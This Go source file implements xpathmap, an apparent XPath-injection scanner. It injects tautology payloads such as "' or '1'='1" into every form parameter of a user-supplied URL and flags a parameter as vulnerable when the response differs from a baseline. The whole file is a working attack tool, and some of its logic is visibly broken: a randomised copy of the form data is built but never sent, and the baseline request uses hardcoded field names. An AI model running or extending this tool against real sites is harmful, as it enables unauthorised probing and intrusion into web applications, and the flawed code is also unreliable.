package main

import(
  "fmt"
  "crypto/tls"
  "net/http"
  "net/url"
  "io"
  "flag"
  "bytes"
  "os"

  "github.com/noc4t/xpathmap/util"
)

const DEBUG = true
var payloads = []string{"INVALID' or '1'='1", "INVALID' or true() and ''='"}

type CmdOptions struct {
  method string
  targetUrl string
  formData url.Values
  ignoreBadCert bool
}


func showBanner() {
  banner := "                  _   _\n" +
  "__  ___ __   __ _| |_| |__  _ __ ___   __ _ _ __\n" +
  "\\ \\/ | '_ \\ / _` | __| '_ \\| '_ ` _ \\ / _` | '_ \\\n" +
  " >  <| |_) | (_| | |_| | | | | | | | | (_| | |_) |\n" +
  "/_/\\_| .__/ \\__,_|\\__|_| |_|_| |_| |_|\\__,_| .__/\n" +
  "     |_|                                   |_|\n"

  fmt.Println(banner)
}

func xRequest(method string, targetUrl string, data url.Values, ignoreBadCert bool) (*http.Response, error) {
  httpClient := &http.Client{
    Transport: &http.Transport{
      TLSClientConfig: &tls.Config{InsecureSkipVerify: ignoreBadCert},
    },
  }

  requestBody := []byte(data.Encode())
  body := bytes.NewBuffer(requestBody)

  req, err := http.NewRequest(method, targetUrl, body)
  if len(data) > 0 {
    req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
  }

  if DEBUG {
    fmt.Println("The body is: " + string(requestBody))
    fmt.Println("The url is: " + req.URL.String())
    fmt.Println("The method is: " + req.Method)
  }

  if err != nil {
    return nil, err
  }

  resp, err := httpClient.Do(req)
  return resp, err
}

func isPageDynamic(cmdOptions CmdOptions) (bool, error) {
  var isDynamic bool = true
  var err error = nil
  formDataCopy := make(url.Values)
  util.MapDeepCopy(formDataCopy, cmdOptions.formData)

  response1, err := xRequest(cmdOptions.method, cmdOptions.targetUrl, cmdOptions.formData, cmdOptions.ignoreBadCert)
  if err != nil {
	  fmt.Println(err)
  }
  for i, _ := range cmdOptions.formData {
    formDataCopy.Set(i, util.GenerateRandomString(10))
  }
  response2, err := xRequest(cmdOptions.method, cmdOptions.targetUrl, cmdOptions.formData, cmdOptions.ignoreBadCert)

  body1, err := io.ReadAll(response1.Body)
  body2, err := io.ReadAll(response2.Body)
  if string(body1) == string(body2) {
    isDynamic = false
  }

  return isDynamic, err
}

func findVulnerableParameter(cmdOptions CmdOptions) ([]string, error) {
  var vulnerableParameters []string
  var err error

  isDynamic, err := isPageDynamic(cmdOptions)
  if err != nil {
    fmt.Println(err)
  }
  if isDynamic {
    fmt.Println("Page appears to be dynamic")
  } else {
    fmt.Println("Page does not appear to be dynamic")
  }

  // check what happens when sending invalid value
  invalidPayload := url.Values{}
  invalidPayload.Set("msg", "something, it doesnt matter")
  invalidPayload.Set("username", cmdOptions.formData.Get("username") + "IMPOSSIBLEPAYLOAD_THISDOESNOTEXIST")

  response, err := xRequest(cmdOptions.method, cmdOptions.targetUrl, invalidPayload, cmdOptions.ignoreBadCert)
  if err != nil {
    return []string{}, err
  }

  invalidResponse, err := io.ReadAll(response.Body)
  if err != nil {
    return []string{}, err
  }

  for i,_ := range  cmdOptions.formData {
    newValues := make(url.Values)
    util.MapDeepCopy(newValues, cmdOptions.formData)
    newValues.Set(i, payloads[0])
    finalResponse, err := xRequest(cmdOptions.method, cmdOptions.targetUrl, newValues, cmdOptions.ignoreBadCert)
    if err != nil {
      return []string{}, err
    }
    finalBody, err := io.ReadAll(finalResponse.Body)
    if err != nil {
      return []string{}, err
    }
    if string(finalBody) != string(invalidResponse) {
      fmt.Println(i + " appears to be vulnerable")
      vulnerableParameters = append(vulnerableParameters, i)
    } else {
      fmt.Println(i + " does not appear to be vulnerable")
    }
  }

  return vulnerableParameters, err
}

// so we can specify multiple -header options
type headerFlag []string
func (s *headerFlag) String() string {
  return fmt.Sprintf("%+v\n", *s)
}
func (s *headerFlag) Set(value string) error {
  *s = append(*s, value)
  return nil
}

func main() {
  showBanner()

  var headers headerFlag

  targetUrl := flag.String("url", "", "Target URL")
  ignoreBadCert := flag.Bool("ignore-cert", false, "Ignore invalid certificates")
  method := flag.String("method", "GET", "HTTP method to be used")
  data := flag.String("data", "", "HTTP Form data")

  flag.Var(&headers, "header", "Specify header for the request, can be specified multiple times")
  flag.Parse()
  if DEBUG {
    fmt.Println(headers)
  }

  if *targetUrl == "" {
    flag.PrintDefaults()
    os.Exit(1)
  }

  var formData url.Values
  var err error
  if *data != "" {
    formData, err = url.ParseQuery(*data)
    if err != nil {
      fmt.Printf("Error when parsing formData: %s\n", err)
      os.Exit(1)
    }
  }

  cmdOptions := CmdOptions{
    method: *method,
    targetUrl: *targetUrl,
    formData: formData,
    ignoreBadCert: *ignoreBadCert,
  }

  vulnerableParams, err := findVulnerableParameter(cmdOptions)
  if err != nil {
    fmt.Printf("Error inside xRequest: %s\n", err)
    os.Exit(1)
  }
  fmt.Printf("Vulnerable param: %s\n", vulnerableParams)
}

